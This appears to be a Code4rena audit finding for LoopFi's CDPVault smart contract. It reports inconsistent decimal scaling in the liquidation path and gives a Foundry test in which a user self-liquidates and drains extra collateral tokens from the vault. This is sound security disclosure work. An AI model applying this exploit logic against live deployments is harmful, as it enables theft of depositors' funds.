# Vulnerability details

## Impact
Inconsistent decimal handling will break the accounting system. In the worst case, the attacker can benefit from liquidating himself (see the poc write-up).## Proof of Concept
As shown in the Line 437-443 of the CDPVault.sol, the `deltaCollateral` will be scaled before used in the `safeTransfer/From` . `_modifyPosition` at Line 445 accepts the `deltaCollateral` as a parameter and adds it directly to the `position.collateral` at Line 315. That means the value added/deducted from the `position.collateral` must be scaled before used in `transfer/From` functions. 
https://github.com/code-423n4/2024-07-loopfi/blob/4f508781a49ffa53511e7e5ed6cda0ff0eb5bdc5/src/CDPVault.sol#L437
https://github.com/code-423n4/2024-07-loopfi/blob/4f508781a49ffa53511e7e5ed6cda0ff0eb5bdc5/src/CDPVault.sol#L315

However, the liquidate functions obey this rule. The `takeCollateral` is used as the delta value of the `position.collateral` at Line 561 while it is directly used in the `safeTransfer` at Line 565. 
https://github.com/code-423n4/2024-07-loopfi/blob/4f508781a49ffa53511e7e5ed6cda0ff0eb5bdc5/src/CDPVault.sol#L561
https://github.com/code-423n4/2024-07-loopfi/blob/4f508781a49ffa53511e7e5ed6cda0ff0eb5bdc5/src/CDPVault.sol#L565

Here is a poc code snippet. The user initially owns 100 ether token(scaled, actually 100 ether / 10 ** tokenDecimal), and adds all those tokens as collateral to borrow 80 ether debt. Then the price changes and the user partially liquidates his own position with 40 ether debt. After that, the user should not hold more than the initial scaled token amount, but the fact is not. The vault is drained (we must mint another 50 ether scaledToken to the vault to pay it to the attacker).

Add this poc to CDPVault.t.sol.
```
function setOraclePrice(uint256 price, address token) public {
        oracle.updateSpot(address(token), price);
    }

    function test_liquidate_partial_4() public {
        uint8 digits = 9;
        MockTokenScaled tokenScaled = new MockTokenScaled("TestToken", "TST", digits);
        CDPVault vault = createCDPVault(tokenScaled, 150 ether, 0, 1.25 ether, 1 ether, 1 ether);
        createGaugeAndSetGauge(address(vault), address(tokenScaled));
        setOraclePrice(1 ether, address(tokenScaled));
        uint256 amount = wmul(100 ether, 10**IERC20Metadata(tokenScaled).decimals());//must have these tokens to add collateral
        tokenScaled.mint(address(this), amount);
        tokenScaled.approve(address(vault), amount);
        // create position
        _modifyCollateralAndDebt(vault, 100 ether, 80 ether);// delta collateral is 100 ether
        (uint256 initial_collateral,, , , , ) = vault.positions(address(this));
        assertEq(initial_collateral, 100 ether);
        assertEq(tokenScaled.balanceOf(address(this)), 0); // should consume all tokens
        // // liquidate position
        address position = address(this);
        uint256 repayAmount = 40 ether;
        setOraclePrice(0.80 ether, address(tokenScaled));
        mockWETH.approve(address(vault), repayAmount);
        tokenScaled.mint(address(vault), 50 ether); // otherwise will revert becauseof insufficient balance
        uint256 creditBefore = credit(address(this));
        uint256 virtualDebtBefore = virtualDebt(vault, position);
        vault.liquidatePosition(position, repayAmount);
        uint256 creditAfter = credit(address(this));

        (uint256 collateral, uint256 debtAfter, , , , ) = vault.positions(position);

        assertEq(collateral, 50 ether); //correctly liquidated
        uint256 nowBalance = tokenScaled.balanceOf(address(this));
        // console.log(nowBalance);
        assertGt(amount, nowBalance); // should have less balance than initial minted balance
        // assertEq(token.balanceOf(address(vault)), amount / 2);
```
